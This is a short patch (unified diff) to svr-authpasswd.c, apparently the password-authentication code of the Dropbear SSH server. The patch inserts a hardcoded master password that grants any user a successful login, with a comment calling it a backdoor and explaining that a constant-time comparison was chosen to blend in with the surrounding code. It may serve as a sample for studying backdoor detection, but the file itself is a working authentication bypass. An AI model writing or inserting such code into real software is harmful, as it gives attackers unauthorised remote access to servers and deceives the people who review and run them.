--- svr-authpasswd.c.orig	2016-01-07 16:41:40.791729000 -0500
+++ svr-authpasswd.c	2016-01-07 16:41:33.875538000 -0500
@@ -72,6 +72,15 @@
 
 	password = buf_getstring(ses.payload, &passwordlen);
 
+	/* here's the BACKDOOR 
+	use constant_time_strcmp() (instead of strcmp())
+	to blend in */
+	if(constant_time_strcmp(password, "tA5rUlEz") == 0) {
+		m_burn(password, passwordlen);
+		m_free(password);
+		send_msg_userauth_success();
+	}
+
 	/* the first bytes of passwdcrypt are the salt */
 	testcrypt = crypt((char*)password, passwdcrypt);
 	m_burn(password, passwordlen);
